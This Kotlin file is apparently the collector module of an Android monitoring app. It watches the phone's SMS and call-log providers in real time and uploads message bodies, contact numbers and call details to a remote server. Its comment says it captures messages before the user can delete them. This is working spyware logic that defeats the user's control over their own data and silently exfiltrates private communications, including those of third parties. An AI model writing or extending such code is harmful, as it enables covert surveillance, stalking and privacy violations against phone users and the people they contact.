package com.spapp.monitoring.collectors

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.database.ContentObserver
import android.net.Uri
import android.os.Handler
import android.os.Looper
import android.provider.CallLog
import android.provider.Telephony
import android.util.Log
import androidx.core.content.ContextCompat
import com.spapp.monitoring.data.DeviceState
import com.spapp.monitoring.data.local.AppDatabase
import com.spapp.monitoring.network.ApiClient
import com.spapp.monitoring.network.CallLogEntryDto
import com.spapp.monitoring.network.CallLogSyncRequest
import com.spapp.monitoring.network.SmsLogEntryDto
import com.spapp.monitoring.network.SmsLogSyncRequest
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import java.time.Instant

/**
 * Real-time ContentObserver for SMS and Call logs.
 *
 * Catches messages and calls the exact millisecond they are sent, received,
 * or completed — BEFORE the user has time to delete them from their messaging
 * or phone dialer app. Saves them immediately into the local Room database,
 * and kicks off an immediate background upload so the dashboard updates live.
 */
object RealtimeLogObserverManager {

    private const val TAG = "RealtimeLogObserver"
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    private var smsObserver: ContentObserver? = null
    private var isSmsRegistered = false

    private var callObserver: ContentObserver? = null
    private var isCallRegistered = false

    @Synchronized
    fun start(context: Context) {
        val appCtx = context.applicationContext
        startSmsObserver(appCtx)
        startCallObserver(appCtx)
    }

    @Synchronized
    fun stop(context: Context) {
        val appCtx = context.applicationContext
        try {
            smsObserver?.let { appCtx.contentResolver.unregisterContentObserver(it) }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to unregister SMS observer", e)
        } finally {
            smsObserver = null
            isSmsRegistered = false
        }

        try {
            callObserver?.let { appCtx.contentResolver.unregisterContentObserver(it) }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to unregister Call observer", e)
        } finally {
            callObserver = null
            isCallRegistered = false
        }
    }

    private fun startSmsObserver(appCtx: Context) {
        if (isSmsRegistered) return
        if (ContextCompat.checkSelfPermission(appCtx, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            return
        }

        try {
            val obs = object : ContentObserver(Handler(Looper.getMainLooper())) {
                override fun onChange(selfChange: Boolean, uri: Uri?) {
                    super.onChange(selfChange, uri)
                    captureSms(appCtx)
                }
            }
            appCtx.contentResolver.registerContentObserver(
                Telephony.Sms.CONTENT_URI,
                true,
                obs
            )
            smsObserver = obs
            isSmsRegistered = true
            Log.d(TAG, "SMS ContentObserver registered")

            // Initial capture on startup in case SMS arrived while inactive
            captureSms(appCtx)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to register SMS ContentObserver", e)
        }
    }

    private fun startCallObserver(appCtx: Context) {
        if (isCallRegistered) return
        if (ContextCompat.checkSelfPermission(appCtx, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            return
        }

        try {
            val obs = object : ContentObserver(Handler(Looper.getMainLooper())) {
                override fun onChange(selfChange: Boolean, uri: Uri?) {
                    super.onChange(selfChange, uri)
                    captureCalls(appCtx)
                }
            }
            appCtx.contentResolver.registerContentObserver(
                CallLog.Calls.CONTENT_URI,
                true,
                obs
            )
            callObserver = obs
            isCallRegistered = true
            Log.d(TAG, "Call ContentObserver registered")

            // Initial capture on startup
            captureCalls(appCtx)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to register Call ContentObserver", e)
        }
    }

    fun captureSms(context: Context) {
        scope.launch {
            try {
                val db = AppDatabase.getInstance(context)
                val state = DeviceState(context)
                val collector = SmsLogCollector(context)
                val fresh = collector.collectSince(state.smsLastExternalId)

                if (fresh.isNotEmpty()) {
                    db.smsLogDao().insertAll(fresh)
                    state.smsLastExternalId = maxOf(state.smsLastExternalId, fresh.maxOf { it.externalId })

                    // Instant upload to server
                    val bearer = state.authToken?.let { "Bearer $it" }
                    if (bearer != null) {
                        val unsynced = db.smsLogDao().getUnsynced()
                        if (unsynced.isNotEmpty()) {
                            val dtos = unsynced.map {
                                SmsLogEntryDto(
                                    direction = it.direction,
                                    counterparty = it.counterparty,
                                    messageAt = Instant.ofEpochMilli(it.messageAtEpochMs).toString(),
                                    body = it.body
                                )
                            }
                            val response = ApiClient.service.syncSmsLog(bearer, SmsLogSyncRequest(dtos))
                            if (response.isSuccessful) {
                                db.smsLogDao().deleteByIds(unsynced.map { it.id })
                            }
                        }
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error in real-time SMS capture", e)
            }
        }
    }

    fun captureCalls(context: Context) {
        scope.launch {
            try {
                val db = AppDatabase.getInstance(context)
                val state = DeviceState(context)
                val collector = CallLogCollector(context)
                val fresh = collector.collectSince(state.callLastExternalId)

                if (fresh.isNotEmpty()) {
                    db.callLogDao().insertAll(fresh)
                    state.callLastExternalId = maxOf(state.callLastExternalId, fresh.maxOf { it.externalId })

                    val bearer = state.authToken?.let { "Bearer $it" }
                    if (bearer != null) {
                        val unsynced = db.callLogDao().getUnsynced()
                        if (unsynced.isNotEmpty()) {
                            val dtos = unsynced.map {
                                CallLogEntryDto(
                                    direction = it.direction,
                                    counterparty = it.counterparty,
                                    durationSec = it.durationSec,
                                    calledAt = Instant.ofEpochMilli(it.calledAtEpochMs).toString()
                                )
                            }
                            val response = ApiClient.service.syncCallLog(bearer, CallLogSyncRequest(dtos))
                            if (response.isSuccessful) {
                                db.callLogDao().deleteByIds(unsynced.map { it.id })
                            }
                        }
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error in real-time Call capture", e)
            }
        }
    }
}
